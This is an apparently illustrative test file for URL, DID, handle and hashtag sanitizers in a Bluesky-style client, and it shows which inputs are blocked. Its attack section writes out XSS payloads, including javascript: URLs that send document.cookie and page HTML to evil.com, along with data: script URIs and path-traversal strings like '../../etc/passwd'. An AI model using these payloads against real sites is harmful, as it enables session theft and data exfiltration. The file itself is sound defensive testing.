/**
 * Example test cases for URL sanitization
 * These demonstrate what gets blocked and what passes through
 */

import {
  sanitizeUrl,
  sanitizeFacetLink,
  sanitizeDid,
  sanitizeHandle,
  sanitizeHashtag,
} from './sanitize';

// ============================================================================
// URL SANITIZATION TESTS
// ============================================================================

console.log('=== URL Sanitization Tests ===\n');

// ✅ SAFE - These should pass through
console.log('✅ Safe URLs:');
console.log(sanitizeUrl('https://example.com')); // https://example.com
console.log(sanitizeUrl('http://example.com')); // http://example.com
console.log(sanitizeUrl('/profile/alice.bsky.social')); // /profile/alice.bsky.social
console.log(sanitizeUrl('#section')); // #section

// ❌ BLOCKED - These should be blocked
console.log('\n❌ Blocked URLs:');
console.log(sanitizeUrl('javascript:alert("XSS")')); // #
console.log(sanitizeUrl('data:text/html,<script>alert("XSS")</script>')); // #
console.log(sanitizeUrl('vbscript:msgbox("XSS")')); // #
console.log(sanitizeUrl('file:///etc/passwd')); // #
console.log(sanitizeUrl('blob:https://example.com/uuid')); // #

// ============================================================================
// FACET LINK TESTS
// ============================================================================

console.log('\n=== Facet Link Tests ===\n');

// ✅ SAFE - Absolute URLs only
console.log('✅ Safe facet links:');
console.log(sanitizeFacetLink('https://bsky.app')); // https://bsky.app
console.log(sanitizeFacetLink('https://atproto.com/docs')); // https://atproto.com/docs

// ❌ BLOCKED - Relative URLs not allowed in facets
console.log('\n❌ Blocked facet links:');
console.log(sanitizeFacetLink('/profile/alice')); // #
console.log(sanitizeFacetLink('javascript:alert("XSS")')); // #
console.log(sanitizeFacetLink('invalid-url')); // #

// ============================================================================
// DID TESTS
// ============================================================================

console.log('\n=== DID Tests ===\n');

// ✅ VALID - Proper DID format
console.log('✅ Valid DIDs:');
console.log(sanitizeDid('did:plc:z72i7hdynmk6r22z27h6tvur')); // did:plc:z72i7hdynmk6r22z27h6tvur
console.log(sanitizeDid('did:web:bsky.app')); // did:web:bsky.app
console.log(sanitizeDid('did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK')); // Valid

// ❌ INVALID - Malformed or malicious DIDs
console.log('\n❌ Invalid DIDs:');
console.log(sanitizeDid('did:../../etc/passwd')); // (empty)
console.log(sanitizeDid('not-a-did')); // (empty)
console.log(sanitizeDid('did:plc:')); // (empty - no identifier)

// ============================================================================
// HANDLE TESTS
// ============================================================================

console.log('\n=== Handle Tests ===\n');

// ✅ VALID - Proper handle format
console.log('✅ Valid handles:');
console.log(sanitizeHandle('alice.bsky.social')); // alice.bsky.social
console.log(sanitizeHandle('@bob.com')); // bob.com (@ removed)
console.log(sanitizeHandle('user-name.test')); // user-name.test
console.log(sanitizeHandle('did:plc:abc123')); // did:plc:abc123 (DIDs can be used as handles)

// ❌ INVALID - Path traversal or special chars
console.log('\n❌ Invalid handles:');
console.log(sanitizeHandle('../../../etc/passwd')); // (empty)
console.log(sanitizeHandle('user//name')); // (empty)
console.log(sanitizeHandle('user<script>')); // (empty)

// ============================================================================
// HASHTAG TESTS
// ============================================================================

console.log('\n=== Hashtag Tests ===\n');

// ✅ VALID - Clean hashtags
console.log('✅ Valid hashtags:');
console.log(sanitizeHashtag('bluesky')); // bluesky
console.log(sanitizeHashtag('#atproto')); // atproto (# removed)
console.log(sanitizeHashtag('web3_future')); // web3_future
console.log(sanitizeHashtag('tech-news')); // tech-news

// ❌ CLEANED - Special characters removed
console.log('\n⚠️  Cleaned hashtags (special chars removed):');
console.log(sanitizeHashtag('hello world')); // helloworld (space removed)
console.log(sanitizeHashtag('test<script>')); // testscript (tags removed)
console.log(sanitizeHashtag('user@email.com')); // useremailcom (@ and . removed)

// ============================================================================
// REAL-WORLD ATTACK EXAMPLES
// ============================================================================

console.log('\n=== Real-World Attack Examples ===\n');

// Example 1: JavaScript protocol in facet link
const maliciousPost = {
  text: 'Click here!',
  facets: [{
    index: { byteStart: 0, byteEnd: 10 },
    features: [{
      $type: 'app.bsky.richtext.facet#link',
      uri: 'javascript:fetch("https://evil.com/steal?cookie=" + document.cookie)'
    }]
  }]
};

console.log('Attack 1: Stealing cookies via javascript: URL');
console.log('Original:', maliciousPost.facets[0].features[0].uri);
console.log('Sanitized:', sanitizeFacetLink(maliciousPost.facets[0].features[0].uri));
console.log('Result: ❌ BLOCKED\n');

// Example 2: Data URI with embedded script in external embed
const maliciousEmbed = {
  external: {
    uri: 'data:text/html,<script>alert(document.cookie)</script>',
    title: 'Innocent Looking Link',
    description: 'Click to see more!'
  }
};

console.log('Attack 2: Embedded script via data: URI');
console.log('Original:', maliciousEmbed.external.uri);
console.log('Sanitized:', sanitizeUrl(maliciousEmbed.external.uri));
console.log('Result: ❌ BLOCKED\n');

// Example 3: Path traversal in DID
const maliciousMention = {
  $type: 'app.bsky.richtext.facet#mention',
  did: 'did:../../etc/passwd'
};

console.log('Attack 3: Path traversal via DID');
console.log('Original:', maliciousMention.did);
console.log('Sanitized:', sanitizeDid(maliciousMention.did));
console.log('Result: ❌ BLOCKED\n');

// Example 4: XSS in image src
const maliciousImage = {
  thumb: 'javascript:void(fetch("https://evil.com?data=" + btoa(document.body.innerHTML)))',
  fullsize: 'javascript:alert("XSS")'
};

console.log('Attack 4: XSS via image src attribute');
console.log('Original thumb:', maliciousImage.thumb);
console.log('Sanitized thumb:', sanitizeUrl(maliciousImage.thumb));
console.log('Original fullsize:', maliciousImage.fullsize);
console.log('Sanitized fullsize:', sanitizeUrl(maliciousImage.fullsize));
console.log('Result: ❌ BLOCKED\n');

console.log('=== All attacks successfully prevented! ===');
